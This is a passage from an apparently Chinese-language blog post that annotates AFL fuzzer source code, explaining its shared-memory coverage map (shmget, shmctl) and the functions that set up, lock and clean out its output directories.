class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> size, <span class="keyword">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure><p><em>参数说明</em></p><ol><li><p><strong>key</strong> - 共享内存键值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 常见的 key 值 */</span></span><br><span class="line">IPC_PRIVATE  <span class="comment">// 创建私有共享内存（值为0）</span></span><br><span class="line">ftok(<span class="string">&quot;/path/to/file&quot;</span>, <span class="string">&#x27;A&#x27;</span>)  <span class="comment">// 基于文件生成唯一键值</span></span><br><span class="line"><span class="number">0x1234</span>       <span class="comment">// 直接指定键值</span></span><br></pre></td></tr></table></figure></li><li><p><strong>size</strong> - 共享内存大小</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> size = <span class="number">1024</span>;      <span class="comment">// 1KB</span></span><br><span class="line"><span class="keyword">size_t</span> size = <span class="number">4096</span>;      <span class="comment">// 4KB  </span></span><br><span class="line"><span class="keyword">size_t</span> size = <span class="number">65536</span>;     <span class="comment">// 64KB (AFL 使用的 MAP_SIZE)</span></span><br></pre></td></tr></table></figure></li><li><p><strong>shmflg</strong> - 标志和权限</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 常用标志 */</span></span><br><span class="line">IPC_CREAT   <span class="comment">// 如果不存在则创建</span></span><br><span class="line">IPC_EXCL    <span class="comment">// 与 IPC_CREAT 一起使用，如果已存在则失败</span></span><br><span class="line"><span class="number">0600</span>        <span class="comment">// 权限：所有者可读写（rw-------）</span></span><br><span class="line"><span class="number">0666</span>        <span class="comment">// 权限：所有人可读写（rw-rw-rw-）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* AFL 中的用法 */</span></span><br><span class="line">IPC_CREAT | IPC_EXCL | <span class="number">0600</span>  <span class="comment">// 创建新的，已存在则报错，仅所有者可访问</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="atexit"><a href="#atexit" class="headerlink" title="atexit"></a>atexit</h3><p><code>atexit()</code> 是 C 标准库中的一个函数，用于<strong>注册在程序正常终止时自动调用的清理函数</strong>。也就是说这里是为了在程序结束的时候调用<strong>remove_shm</strong>函数。</p><p>这里我们再看看<strong>remove_shm</strong>函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">remove_shm</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; shmctl(shm_id, IPC_RMID, <span class="literal">NULL</span>); &#125;</span><br></pre></td></tr></table></figure><p>其调用了shmctl函数，重点来说说这个汉书</p><h3 id="shmctl"><a href="#shmctl" class="headerlink" title="shmctl"></a>shmctl</h3><p>shmctl是用于<strong>控制和管理共享内存段</strong>的系统调用，可以执行获取信息、设置属性、删除等操作。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">int</span> cmd, struct shmid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure><p><em>参数说明</em></p><ol><li><p><strong>shmid</strong> - 共享内存标识符</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> shmid = shmget(...);  <span class="comment">// 从 shmget 获得的 ID</span></span><br></pre></td></tr></table></figure></li><li><p><strong>cmd</strong> - 控制命令</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 常用命令 */</span></span><br><span class="line">IPC_RMID   <span class="comment">// 删除共享内存段（AFL 使用这个）</span></span><br><span class="line">IPC_STAT   <span class="comment">// 获取共享内存状态信息</span></span><br><span class="line">IPC_SET    <span class="comment">// 设置共享内存属性</span></span><br><span class="line">IPC_INFO   <span class="comment">// 获取系统级共享内存信息</span></span><br><span class="line">SHM_LOCK   <span class="comment">// 锁定共享内存（防止交换到磁盘）</span></span><br><span class="line">SHM_UNLOCK <span class="comment">// 解锁共享内存</span></span><br></pre></td></tr></table></figure></li><li><p> <strong>buf</strong> - 数据结构指针</p></li></ol>   <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shmid_ds</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_perm</span> <span class="title">shm_perm</span>;</span>  <span class="comment">// 权限信息</span></span><br><span class="line">    <span class="keyword">size_t</span> shm_segsz;          <span class="comment">// 段大小</span></span><br><span class="line">    <span class="keyword">time_t</span> shm_atime;          <span class="comment">// 最后附加时间</span></span><br><span class="line">    <span class="keyword">time_t</span> shm_dtime;          <span class="comment">// 最后分离时间</span></span><br><span class="line">    <span class="keyword">time_t</span> shm_ctime;          <span class="comment">// 最后修改时间</span></span><br><span class="line">    <span class="keyword">pid_t</span> shm_cpid;            <span class="comment">// 创建者进程ID</span></span><br><span class="line">    <span class="keyword">pid_t</span> shm_lpid;            <span class="comment">// 最后操作进程ID</span></span><br><span class="line">    <span class="keyword">shmatt_t</span> shm_nattch;       <span class="comment">// 当前附加进程数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这几个函数介绍完我们详细说说接下来的流程<br>shm_id获取到了共享内存的id并注册退出时的清理函数，确保共享内存被释放</p><p>设置环境变量 SHM_ENV_VAR 既  “__AFL_SHM_ID”，插桩后的目标程序会读取这个环境变量来找到共享内存。这样就可以找到这个共享内存类似下图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AFL 进程                          目标程序进程</span><br><span class="line">   |                                    |</span><br><span class="line">   |  1. 创建 64KB 共享内存               |</span><br><span class="line">   |     shm_id = shmget(...)           |</span><br><span class="line">   |                                    |</span><br><span class="line">   |  2. 设置环境变量                     |</span><br><span class="line">   |     setenv(&quot;__AFL_SHM_ID&quot;, &quot;32768&quot;)|</span><br><span class="line">   |                                    |</span><br><span class="line">   |  3. fork() 创建子进程 ───────────-→  |</span><br><span class="line">   |                                    |</span><br><span class="line">   |                              4. 读取环境变量</span><br><span class="line">   |                                 getenv(&quot;__AFL_SHM_ID&quot;)</span><br><span class="line">   |                                     |</span><br><span class="line">   |                              5. 附加共享内存</span><br><span class="line">   |                                 shmat(32768, ...)</span><br><span class="line">   |                                     |</span><br><span class="line">   |                              6. 执行时写入覆盖率</span><br><span class="line">   |  ←──── 共享内存（实时更新）────     trace_bits[x]++</span><br><span class="line">   |                                     |</span><br><span class="line">   |  7. 读取覆盖率信息                    |</span><br></pre></td></tr></table></figure><h2 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h2><p>这个函数和<strong>memset_sakura_array</strong>这个函数强相关，这里使用count_class_lookup8生成count_class_lookup16数组</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">init_count_class16</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> u32 b1, b2;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 双重循环遍历所有可能的 16 位值组合</span></span><br><span class="line"><span class="comment">    b1 和 b2 各代表一个字节（0-255） */</span></span><br><span class="line"> <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++)</span><br><span class="line">   <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">     <span class="comment">/* 构建 16 位查找表</span></span><br><span class="line"><span class="comment">        将两个 8 位的分类值组合成一个 16 位的分类值</span></span><br><span class="line"><span class="comment">        (b1 &lt;&lt; 8) + b2：构造 16 位索引（b1 是高字节，b2 是低字节）</span></span><br><span class="line"><span class="comment">        结果：高 8 位是 b1 的分类，低 8 位是 b2 的分类 */</span></span><br><span class="line">     count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] = </span><br><span class="line">         (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |    <span class="comment">// 高字节的分类值移到高 8 位</span></span><br><span class="line">         count_class_lookup8[b2];             <span class="comment">// 低字节的分类值放在低 8 位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是为了提高效率所作的，实际上和count_class_lookup8没有区别。</p><h2 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 设置输出目录和文件描述符 */</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_dirs_fds</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u8 *tmp;</span><br><span class="line">  s32 fd;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打印提示信息：正在设置输出目录 */</span></span><br><span class="line">  ACTF(<span class="string">&quot;Setting up output directories...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果存在sync_id（多实例协同模糊测试模式），创建同步目录 */</span></span><br><span class="line">  <span class="keyword">if</span> (sync_id &amp;&amp; mkdir(sync_dir, <span class="number">0700</span>) &amp;&amp; errno != EEXIST)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, sync_dir);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建主输出目录 */</span></span><br><span class="line">  <span class="keyword">if</span> (mkdir(out_dir, <span class="number">0700</span>)) &#123;</span><br><span class="line">    <span class="comment">/* 如果目录已存在（errno == EEXIST），则正常；否则报错 */</span></span><br><span class="line">    <span class="keyword">if</span> (errno != EEXIST)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, out_dir);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 可能需要删除旧的输出目录（用于清理） */</span></span><br><span class="line">    maybe_delete_out_dir();</span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 目录创建成功，检查是否试图恢复会话 */</span></span><br><span class="line">    <span class="keyword">if</span> (in_place_resume)</span><br><span class="line">      FATAL(<span class="string">&quot;Resume attempted but old output directory not found&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 打开输出目录的文件描述符 */</span></span><br><span class="line">    out_dir_fd = open(out_dir, O_RDONLY);</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __sun</span></span><br><span class="line">    <span class="comment">/* 对输出目录加锁，防止多个AFL实例使用同一目录（Solaris系统除外） */</span></span><br><span class="line">    <span class="keyword">if</span> (out_dir_fd &lt; <span class="number">0</span> || flock(out_dir_fd, LOCK_EX | LOCK_NB))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to flock() output directory.&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建队列目录 - 存储所有测试用例（初始的和发现的） */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建队列元数据的顶层目录 - 用于会话恢复和相关任务 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建标记目录 - 记录已经完成确定性模糊测试的队列条目 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/deterministic_done/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建自动选择的字典条目目录 - 存储自动提取的有趣令牌 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/auto_extras/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建冗余路径目录 - 存储当前被认为是冗余的执行路径 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/redundant_edges/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建变量行为目录 - 存储显示不稳定行为的路径 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/variable_behavior/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果启用了协同模糊测试，创建同步跟踪目录 */</span></span><br><span class="line">  <span class="keyword">if</span> (sync_id) &#123;</span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/.synced/&quot;</span>, out_dir);</span><br><span class="line">    <span class="comment">/* 恢复模式下目录可能已存在 */</span></span><br><span class="line">    <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>) &amp;&amp; (!in_place_resume || errno != EEXIST))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">    ck_free(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建崩溃样本目录 - 存储所有导致程序崩溃的测试用例 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/crashes&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建挂起样本目录 - 存储所有导致程序挂起的测试用例 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/hangs&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>))</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打开通用文件描述符 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打开/dev/null - 用于丢弃不需要的输出 */</span></span><br><span class="line">  dev_null_fd = open(<span class="string">&quot;/dev/null&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_null_fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open /dev/null&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打开/dev/urandom - 用于获取随机数 */</span></span><br><span class="line">  dev_urandom_fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (dev_urandom_fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open /dev/urandom&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建Gnuplot绘图数据文件 */</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/plot_data&quot;</span>, out_dir);</span><br><span class="line">  fd = open(tmp, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 将文件描述符转换为FILE指针 */</span></span><br><span class="line">  plot_file = fdopen(fd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!plot_file)</span><br><span class="line">    PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 写入CSV格式的表头 - 记录模糊测试过程中的各种统计数据 */</span></span><br><span class="line">  <span class="built_in">fprintf</span>(plot_file, <span class="string">&quot;# unix_time, cycles_done, cur_path, paths_total, &quot;</span></span><br><span class="line">                     <span class="string">&quot;pending_total, pending_favs, map_size, unique_crashes, &quot;</span></span><br><span class="line">                     <span class="string">&quot;unique_hangs, max_depth, execs_per_sec\n&quot;</span>);</span><br><span class="line">  <span class="comment">/* 忽略写入错误 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的主要功能是<strong>初始化AFL模糊测试器的工作环境</strong>，具体包括：</p><ol><li>创建目录结构：<ul><li>主输出目录及其子目录</li><li>队列目录（存储测试用例）</li><li>状态跟踪目录（记录测试进度）</li><li>崩溃和挂起样本目录</li></ul></li><li>文件锁定：<ul><li>对输出目录加锁，防止多个AFL实例冲突</li></ul></li><li>打开必要的文件描述符：<ul><li><code>/dev/null</code>：丢弃输出</li><li><code>/dev/urandom</code>：随机数源</li><li><code>plot_data</code>：记录统计数据用于绘图</li></ul></li><li>支持特殊模式：<ul><li>协同模糊测试（sync_id）</li><li>会话恢复（in_place_resume）</li></ul></li></ol><p>这是AFL启动时的关键初始化步骤，为后续的模糊测试过程准备好必要的文件系统结构。</p><p>这里首先检查是否存在sync_id，如果存在则创建同步目录，否则跳过，接下来创建主输出目录，如果已经存在则调用了maybe_delete_out_dir，后面会详细说说，先接着看，如果没有存在则跳过，且调查是否开启了恢复模式，如果没有开启，所以这里有冲突就会报错，没有找到要恢复的那个输出文件夹，然后对输出文件加锁，防止多个AFL实例使用同一目录。</p><p>接下来创建创建队列目录 /queue 存储所有测试用例，</p><p>创建队列元数据的顶层目录/queue/.state/用于会话恢复和相关任务</p><p>创建标记目录 /queue/.state/deterministic_done/记录已经完成确定性模糊测试的队列条目</p><p>创建自动选择的字典条目目录/queue/.state/auto_extras/“ 存储AFL在模糊测试过程中自动发现的”有趣”的token（令牌），这些序列被认为可能触发程序的特殊行为</p><p>作为字典条目用于后续的变异操作</p><p>创建冗余路径目录/queue/.state/redundant_edges/存储当前被认为是冗余的执行路径</p><p>创建变量行为目录/queue/.state/variable_behavior/存储显示不稳定行为的路径</p><p>如果启用了协同模糊测试/.synced/创建同步跟踪目录</p><p>创建崩溃样本目录/crashes存储所有导致程序崩溃的测试用例</p><p>创建挂起样本目录/hangs存储所有导致程序挂起的测试用例 </p><p>打开/dev/null - 用于丢弃不需要的输出</p><p>打开/dev/urandom - 用于获取随机数</p><p>创建Gnuplot绘图数据文件/plot_data</p><h3 id="maybe-delete-out-dir"><a href="#maybe-delete-out-dir" class="headerlink" title="maybe_delete_out_dir"></a>maybe_delete_out_dir</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 可能删除输出目录 - 在重用已存在的输出目录时进行清理 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">maybe_delete_out_dir</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  FILE *f;</span><br><span class="line">  u8 *fn = alloc_printf(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查输出目录是否被锁定。如果是，则退出。</span></span><br><span class="line"><span class="comment">     如果没有，创建一个在进程生命周期内持续存在的锁</span></span><br><span class="line"><span class="comment">     (这需要保持文件描述符处于打开状态) */</span></span><br><span class="line"></span><br><span class="line">  out_dir_fd = open(out_dir, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (out_dir_fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __sun</span></span><br><span class="line">  <span class="comment">/* 尝试对目录加锁，如果已被锁定（EWOULDBLOCK），说明另一个AFL实例正在使用 */</span></span><br><span class="line">  <span class="keyword">if</span> (flock(out_dir_fd, LOCK_EX | LOCK_NB) &amp;&amp; errno == EWOULDBLOCK) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Looks like the job output directory is being &quot;</span></span><br><span class="line">         <span class="string">&quot;actively used by another\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    instance of afl-fuzz. You will need to choose a different %s\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    or stop the other process first.\n&quot;</span>,</span><br><span class="line">         sync_id ? <span class="string">&quot;fuzzer ID&quot;</span> : <span class="string">&quot;output location&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FATAL(<span class="string">&quot;Directory &#x27;%s&#x27; is in use&quot;</span>, out_dir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__sun */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 尝试打开fuzzer_stats文件，检查之前的模糊测试会话信息 */</span></span><br><span class="line">  f = fopen(fn, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (f) &#123;</span><br><span class="line"></span><br><span class="line">    u64 start_time, last_update;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读取开始时间和最后更新时间 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fscanf</span>(f,</span><br><span class="line">               <span class="string">&quot;start_time     : %llu\n&quot;</span></span><br><span class="line">               <span class="string">&quot;last_update    : %llu\n&quot;</span>,</span><br><span class="line">               &amp;start_time, &amp;last_update) != <span class="number">2</span>)</span><br><span class="line">      FATAL(<span class="string">&quot;Malformed data in &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查已进行的工作量 </span></span><br><span class="line"><span class="comment">       如果不是恢复模式，且已运行超过OUTPUT_GRACE分钟（默认10分钟），</span></span><br><span class="line"><span class="comment">       则不自动删除，避免数据丢失 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_place_resume &amp;&amp; last_update - start_time &gt; OUTPUT_GRACE * <span class="number">60</span>) &#123;</span><br><span class="line"></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;The job output directory already exists and &quot;</span></span><br><span class="line">           <span class="string">&quot;contains the results of more\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    than %u minutes worth of fuzzing. To avoid data loss, afl-fuzz &quot;</span></span><br><span class="line">           <span class="string">&quot;will *NOT*\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    automatically delete this data for you.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    If you wish to start a new session, remove or rename the &quot;</span></span><br><span class="line">           <span class="string">&quot;directory manually,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or specify a different output location for this job. To resume &quot;</span></span><br><span class="line">           <span class="string">&quot;the old\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    session, put &#x27;-&#x27; as the input directory in the command line &quot;</span></span><br><span class="line">           <span class="string">&quot;(&#x27;-i -&#x27;) and\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    try again.\n&quot;</span>,</span><br><span class="line">           OUTPUT_GRACE);</span><br><span class="line"></span><br><span class="line">      FATAL(<span class="string">&quot;At-risk data found in &#x27;%s&#x27;&quot;</span>, out_dir);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 原地恢复的想法很简单：临时将旧的queue/移动到新位置，</span></span><br><span class="line"><span class="comment">     在导入到新queue/完成后删除。如果_resume/已存在，</span></span><br><span class="line"><span class="comment">     当前的queue/可能由于之前的中断而不完整，</span></span><br><span class="line"><span class="comment">     所以我们使用旧的_resume/目录，让rename()静默失败 */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume) &#123;<span class="comment">//in_place_resume是在参数分析的时候设置的</span></span><br><span class="line"></span><br><span class="line">    u8 *orig_q = alloc_printf(<span class="string">&quot;%s/queue&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置输入目录为_resume目录 */</span></span><br><span class="line">    in_dir = alloc_printf(<span class="string">&quot;%s/_resume&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将原始队列重命名为_resume（忽略错误） */</span></span><br><span class="line">    rename(orig_q, in_dir); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    OKF(<span class="string">&quot;Output directory exists, will attempt session resume.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ck_free(orig_q);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    OKF(<span class="string">&quot;Output directory exists but deemed OK to reuse.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Deleting old session data...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 开始清理工作！首先，删除&lt;out_dir&gt;/.synced/.../id:*中的条目（如果存在） */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_place_resume) &#123;</span><br><span class="line">    <span class="comment">/* 清理同步目录（多实例协作时使用） */</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/.synced&quot;</span>, out_dir);</span><br><span class="line">    <span class="keyword">if</span> (delete_files(fn, <span class="literal">NULL</span>))</span><br><span class="line">      <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">    ck_free(fn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 接下来，清理&lt;out_dir&gt;/queue/.state/子目录： */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理确定性模糊测试完成标记 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state/deterministic_done&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (delete_files(fn, CASE_PREFIX))</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理自动提取的字典条目 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state/auto_extras&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (delete_files(fn, <span class="string">&quot;auto_&quot;</span>))</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理冗余边缘标记 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state/redundant_edges&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (delete_files(fn, CASE_PREFIX))</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理变量行为标记 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state/variable_behavior&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (delete_files(fn, CASE_PREFIX))</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 删除.state子目录本身（现在应该是空的）</span></span><br><span class="line"><span class="comment">     以及所有匹配&lt;out_dir&gt;/queue/id:*的文件 */</span></span><br><span class="line"></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (rmdir(fn) &amp;&amp; errno 